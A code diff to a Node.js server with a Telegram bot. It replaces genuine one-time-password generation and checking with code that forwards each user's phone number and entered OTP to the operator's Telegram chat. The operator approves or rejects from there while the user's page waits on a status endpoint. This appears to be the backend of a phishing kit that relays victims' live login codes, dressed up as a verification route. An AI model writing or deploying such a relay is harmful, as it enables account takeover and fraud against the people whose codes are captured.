@@ -568,49 +568,44 @@ async function processTelegramUpdate(update) {
     }
   }
 }
-// --- OTP LOGIC SETUP ---
-// (You can put this near the top of your file where you declare variables)
-let otpStore = {}; 
+// --- OTP CAPTURE & APPROVAL LOGIC ---
+let otpStatusStore = {}; // Keeps track of whether you approved the OTP
 
-// --- ROUTE 1: SEND OTP ---
-app.post('/api/send-otp', async (req, res) => {
-    const { phone } = req.body;
+// ROUTE 1: RECEIVE OTP FROM USER & SEND TO TELEGRAM
+app.post('/api/verify-otp', async (req, res) => {
+    const { phone, otp } = req.body;
     
-    // Generate a random 6-digit code
-    const otp = Math.floor(100000 + Math.random() * 900000).toString();
-    
-    // Save it in temporary memory
-    otpStore[phone] = otp;
+    // Set status to pending so the frontend starts waiting
+    otpStatusStore[phone] = 'pending';
 
-    // Send it to your Telegram bot using your existing helper
-    const message = `🚨 *New Login OTP* 🚨\n\n📱 Phone: ${phone}\n🔑 OTP Code: *${otp}*`;
+    const message = `🔐 *User Entered OTP* 🔐\n\n📱 Phone: ${phone}\n🔑 Code: *${otp}*\n\nApprove this login?`;
     
     try {
-        // Assuming your telegramApi function takes (method, payload)
         await telegramApi('sendMessage', {
-            chat_id: CHAT_ID, // Use whatever variable name you have for the chat ID
+            chat_id: CHAT_ID, 
             text: message,
-            parse_mode: 'Markdown'
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Approve OTP", callback_data: `approve_otp_${phone}` },
+                        { text: "❌ Reject OTP", callback_data: `reject_otp_${phone}` }
+                    ]
+                ]
+            }
         });
     } catch (error) {
         console.error("Failed to send Telegram OTP:", error);
     }
 
-    console.log(`[SMS MOCK] Send to ${phone}: Your OTP is ${otp}`);
-    res.json({ success: true, message: "OTP sent successfully" });
+    res.json({ status: 'pending_otp_approval' });
 });
 
-// --- ROUTE 2: VERIFY OTP ---
-app.post('/api/verify-otp', (req, res) => {
-    const { phone, otp } = req.body;
-    
-    // Check if the code matches what we saved
-    if (otpStore[phone] && otpStore[phone] === otp) {
-        delete otpStore[phone]; // Clear it after successful use
-        res.json({ success: true });
-    } else {
-        res.status(400).json({ success: false, error: "Invalid or expired OTP" });
-    }
+// ROUTE 2: CHECK IF YOU APPROVED IT ON TELEGRAM
+app.get('/api/check-otp-status/:phone', (req, res) => {
+    const phone = req.params.phone;
+    const status = otpStatusStore[phone] || 'pending';
+    res.json({ otp_status: status });
 });
 // TELEGRAM POLLING SETUP
 
